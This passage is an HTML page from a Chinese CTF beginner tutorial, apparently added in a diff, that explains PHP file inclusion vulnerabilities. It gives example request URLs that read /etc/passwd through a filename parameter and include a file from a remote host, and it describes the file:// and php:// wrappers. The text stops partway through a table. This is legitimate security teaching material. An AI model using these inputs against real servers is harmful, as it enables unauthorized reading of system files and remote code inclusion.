@@ -1,0 +1,1516 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>文件包含 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-wrench"/></svg>环境<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-env/">环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/CTFtool/">工具一览</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Docker_On_Linux/">Docker环境</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Crypto/">Crypto环境设置</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser_base/">PHP反序列化基础</a>
+    
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link on" href="./">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP 代码审计</a>
+    
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/CTFevent/">CTF赛事</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="_1">文件包含漏洞<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
+<h2 id="_2">文件包含概述<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>开发人员常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+</blockquote>
+<p>比如说 <code>Python</code> 中我们可以通过 <code>import</code> 导入其他Python文件中的代码，从而实现 Base 编解码的功能。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'Hello CTF'</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+</code></pre></div>
+<p>又比如 <code>C语言</code> 中的 <code>include</code> 将 <code>stdio.h</code> 文件中的代码包含到当前文件中，从而实现标准输入输出。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Hello CTF"</span><span class="p">);</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>文件包含漏洞</strong> 通常出现在*动态网页*中，有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，比如：<em>对传入的文件名没有经过合理的校验，或者校检被绕过</em>，就导致攻击者可以通过修改文件的位置来让后台*包含任意文件*，从而导致文件包含漏洞。</p>
+<blockquote>
+<p>注意：<em>网上常说的文件读取漏洞、文件下载漏洞均可理解为文件包含漏洞。</em></p>
+</blockquote>
+<p>大多数Web语言都支持文件包含操作，其中 PHP 语言所提供的文件包含功能太强大、太灵活，也就导致文件包含漏洞经常出现在 PHP 语言中。</p>
+<p>在 PHP 中常用的文件包含函数有以下四种：</p>
+<ul>
+<li>include()</li>
+</ul>
+<p>找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
+<ul>
+<li>include_once()</li>
+</ul>
+<p>与 <code>include()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<ul>
+<li>require()</li>
+</ul>
+<p>找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
+<ul>
+<li>require_once()</li>
+</ul>
+<p>与 <code>require()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
+<p>当以上 <em>四种函数</em> 参数可控的情况下，我们需要知道以下两点特性，</p>
+<ul>
+<li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。</li>
+<li>若文件内容不符合 PHP 语法规范则会暴漏其源码。</li>
+</ul>
+<p>当然除了以上常用的文件包含函数外，还有以下可以实现读取文件内容的函数，感兴趣的读者可以自行百度。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">file_get_contents()</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">highlight_file()</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">fopen()</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="x">readfile()</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="x">fread()</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="x">fgetss()</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="x">fgets()</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="x">parse_ini_file()</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="x">show_source()</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="x">file()</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="x">var_dump(scandir('/')); </span>
+</code></pre></div>
+<h2 id="_3">文件包含分类<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<p>在文件包含中，主要分为 <code>本地</code> 和 <code>远程</code> 两种类别，分类取决于所包含文件位置的不同。这两种分类依赖于 <code>php.ini</code> 中的两个配置项，注意对配置进行更改时，注意 <code>On / Off</code> 开头需大写，其次，修改完配置文件后务必要重启 Web 服务，使其配置文件生效。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="na">allow_url_fopen （默认开启）</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="na">allow_url_include #（默认关闭，远程文件包含必须开启）</span>
+</code></pre></div>
+<p><img alt="img" src="../assets/include/image7.jpeg"></p>
+<h3 id="_4">本地文件包含<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p>当被包含的文件在服务器本地时，如下图所示。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://127.0.0.1/?filename=/etc/passwd
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>http://127.0.0.1/?filename=./phpinfo.txt
+</code></pre></div>
+<p><img alt="image-20240109083917788" src="../assets/include/image-20240109083917788.png"></p>
+<p><img alt="image-20240109083446193" src="../assets/include/image-20240109083446193.png"></p>
+<h3 id="_5">远程文件包含<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<p>当被包含的文件在远程服务器时，如下图所示。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>http://127.0.0.1/?filename=http://loki.la/ReaDME.md
+</code></pre></div>
+<p><img alt="image-20240109083909634" src="../assets/include/image-20240109083909634.png"></p>
+<h2 id="_6">如何判断服务器类型<a class="headerlink" href="#_6" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>虽然判断服务器类型的必要性不是很大，因为按照国内比赛的套路来看，题目环境基本为 Linux + Apache，不过还是有必要性说一下思路的。</p>
+</blockquote>
+<h3 id="_7">读取文件<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p>可以尝试读取 <code>/etc/passwd</code> 如果可行则代表操作系统为 Linux，反之为 Windows（注意判断不是百分百正确，不排除可控点存在过滤不允许任意文件包含）</p>
+<h3 id="_8">大小写混写<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
+<p>可以在文件包含读取文件时，利用大小写敏感的特性来判断服务器类型，因为在 Linux 中严格区分大小写，而 Windows 不区分大小写。</p>
+<p>如：在 Windows 下你要包含的文件为 <code>lfi.txt</code>，即使你写成 <code>Lfi.txt</code>、<code>lFi.tXT</code>等形式也可包含成功。</p>
+<h2 id="_9">文件包含协议<a class="headerlink" href="#_9" title="Permanent link">¶</a></h2>
+<h3 id="file">file://<a class="headerlink" href="#file" title="Permanent link">¶</a></h3>
+<ul>
+<li>
+<p><strong>条件</strong>：</p>
+</li>
+<li>
+<p>allow_url_fopen：不受影响</p>
+</li>
+<li>
+<p>allow_url_include：不受影响</p>
+</li>
+<li>
+<p><strong>作用</strong>：</p>
+</li>
+</ul>
+<p>用于访问本地文件系统。</p>
+<ul>
+<li><strong>说明</strong>：</li>
+</ul>
+<p><em>file://</em> 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</p>
+<p>在某些函数里，例如 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， <code>include_path</code> 会可选地搜索，也作为相对的路径。</p>
+<ul>
+<li><strong>用法</strong>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>file:///etc/passwd
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>file://C:/Windows/win.ini
+</code></pre></div>
+<ul>
+<li><strong>示例</strong>：</li>
+</ul>
+<p>file://[文件的绝对路径和文件名]</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>http://127.0.0.1/?filename=file:///etc/passwd
+</code></pre></div>
+<p><img alt="image-20240109083815474" src="../assets/include/image-20240109083815474.png"></p>
+<h3 id="php">php://<a class="headerlink" href="#php" title="Permanent link">¶</a></h3>
+<ul>
+<li>
+<p><strong>条件</strong>：</p>
+</li>
+<li>
+<p>allow_url_fopen：不受影响</p>
+</li>
+<li>
+<p>allow_url_include：仅 <code>php://input</code>、 <code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code></p>
+</li>
+<li>
+<p><strong>作用</strong>：
+  访问各个输入/输出流（I/O streams）</p>
+</li>
+<li>
+<p><strong>说明</strong>：
+  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
+  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>php://input</td>
+<td>可以访问请求的原始数据的只读流。 如果启用了 <a href="https://www.php.net/manual/zh/ini.core.php#ini.enable-post-data-reading">enable_post_data_reading</a> 选项， php://input 在使用 <code>enctype="multipart/form-data"</code> 的 POST 请求中不可用。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td>只写的数据流， 允许你以 <a href="https://www.php.net/manual/zh/function.print.php">print</a> 和 <a href="https://www.php.net/manual/zh/function.echo.php">echo</a> 一样的方式 写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td>(&gt;=5.3.6) php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td>(&gt;=5.1.0) 类似文件 包装器的数据流，允许读写临时数据。 两者的一个区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <a href="https://www.php.net/manual/zh/function.sys-get-temp-dir.php">sys_get_temp_dir()</a> 的方式一致。php://temp 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，<code>NN</code> 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>(&gt;=5.0.0) 元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>php://filter 参数详解</strong></li>
+</ul>
+<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">名称</th>
+<th style="text-align: left;">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td style="text-align: left;">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>read=&lt;读链的筛选列表&gt;</code></td>
